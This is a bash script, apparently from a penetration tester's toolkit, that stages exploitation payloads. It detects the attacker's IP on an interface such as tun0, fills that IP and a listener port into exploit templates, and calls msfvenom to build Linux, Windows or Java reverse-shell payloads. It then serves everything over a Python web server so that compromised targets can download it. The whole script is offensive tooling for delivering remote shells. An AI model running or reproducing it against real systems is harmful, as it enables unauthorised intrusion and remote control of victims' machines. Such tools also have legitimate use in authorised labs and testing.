#!/bin/bash
##############################################################################
# This script helps in hosting useful scripts or binaries for exploitation.  #
# What it does is:
#  * show your IP
#  * list available files
#  * create actual scripts from templates (replaces with correct ip)
#  * host webserver on port 80
##############################################################################

# defaults
lport=139
iface='tun0'
http_port=80
msfvenom=''


# colors!
nc=$(tput sgr0) # No Color
red=$(tput setaf 1)
green=$(tput setaf 2)
yellow=$(tput setaf 190)
blue=$(tput setaf 4)
grey=$(tput setaf 245)

# parse command line args
while [[ $# -gt 0 ]]; do
  case $1 in
    -h|--help)
      echo "$0 [-p LPORT] [-i IFACE] [-H HTTP_PORT] [-m lsr64.elf,wsr.c,...]" >&2
      echo "  -p LPORT      specify local port for reverse shell" >&2
      echo "  -i IFACE      specify interface to determine IP address, e.g. tun0 or eth0" >&2
      echo "  -m SHELLTYPE  specify the kind of shell you want to generate, e.g." >&2
      echo "                lsr64.elf - linux shell reverse 64bit in elf format" >&2
      echo "                wsr.c     - windows shell reverse 32bit in c format" >&2
      exit 0
      ;;
    -p|--port)
      lport="$2"
      shift # past argument
      shift # past value
      ;;
    -i|--iface)
      iface="$2"
      shift # past argument
      shift # past value
      ;;
    -H|--http-port)
      http_port="$2"
      shift # past argument
      shift # past value
      ;;
    -m|--msfvenom)
      msfvenom="$2"
      shift # past argument
      shift # past value
      ;;
    -*|--*)
      echo "Unknown option $1"
      exit 1
      ;;
  esac
done

# check the specified interface is valid
err=$(ip address show "${iface}" 2>&1)
if [[ "$?" -ne "0" ]]; then
    echo "Error: ${err} Specify a valid interface with the -i option."
    exit 1
fi
lhost=$(ip address show $iface | grep -oP '(?<=inet )[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
printf '%s\n' "${grey}LHOST: ${lhost}"
printf '%s\n' "${grey}LPORT: ${lport}"

this_dir="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
files="${this_dir}/files"
cd ${this_dir}

###############################################################
#---------------) Poor man's template engine (----------------#
###############################################################
template_dir="${this_dir}/templates"

find "${template_dir}" -type f | while read filename
do
    new_filename=${files}/$(basename ${filename})
    printf '%s\n' "${grey}Generating $new_filename"
    cp $filename $new_filename
    sed -i "s/{{lhost}}/${lhost}/g" $new_filename
    sed -i "s/{{lport}}/${lport}/g" $new_filename
done


###############################################################
#---------------) generate msfvenom payloads (----------------#
###############################################################
if [ -n "$msfvenom" ] && (! [[ -f .last ]] || ! grep -wq ${lhost} .last || ! grep -wq ${lport} .last)
then
    [[ "${msfvenom}" =~ ^w ]] && os='windows/'
    [[ "${msfvenom}" =~ ^l ]] && os='linux/'
    [[ "${msfvenom}" =~ ^j ]] && os='java/'

    [[ "${msfvenom}" =~ .sr ]] && shell='shell_reverse_tcp'

    if [[ "${msfvenom}" =~ 64$ ]]
    then
        arch='x64/'
    else
        [[ "${msfvenom}" =~ ^w ]] && arch=''
        [[ "${msfvenom}" =~ ^l ]] && arch='x86/'
    fi

    format=$(echo $msfvenom | grep -oP '(?<=\.).+$')
    if [ -z "$format" ]; then echo "No format specified"; exit 1; fi

    echo "Generating msfvenom payload..."
    msfvenom -f ${format} -p ${os}${arch}${shell} LHOST=${lhost} LPORT=${lport} -o ${files}/${msfvenom}

    echo ${lhost} > .last
    echo ${lport} >> .last
fi

#########################################################
#---------------) List available files (----------------#
#########################################################
# echo files to get

win_tmp=$(mktemp /tmp/transfers-XXXXXX)
lin_tmp=$(mktemp /tmp/transfers-XXXXXX)
oth_tmp=$(mktemp /tmp/transfers-XXXXXX)

find ${files} -maxdepth 1 \
    -not -type d \
    -printf "%f\n" | while read line
do
    case "$line" in
        *.exe|*.ps1|*.asp|*.aspx|*.bat|*.vbs|wsr*) echo $line >> $win_tmp
               ;;
        *.sh|*.elf|lsr*|pspy*|suid3num*|linux*|unix*) echo $line >> $lin_tmp
               ;;
        *) echo $line >> $oth_tmp
           ;;
    esac
done

printf "\n"
printf $yellow; cat $win_tmp | sort | column; printf $nc
printf $green; cat $lin_tmp | sort | column; printf $nc
printf $blue; cat $oth_tmp | sort | column; printf $nc
printf "\n"

rm $win_tmp
rm $lin_tmp
rm $oth_tmp

##########################################################
#---------------) Host python webserver (----------------#
##########################################################
echo "Your IP: ${green}${lhost}${nc}"
cd ${files} && python3 -m http.server $http_port
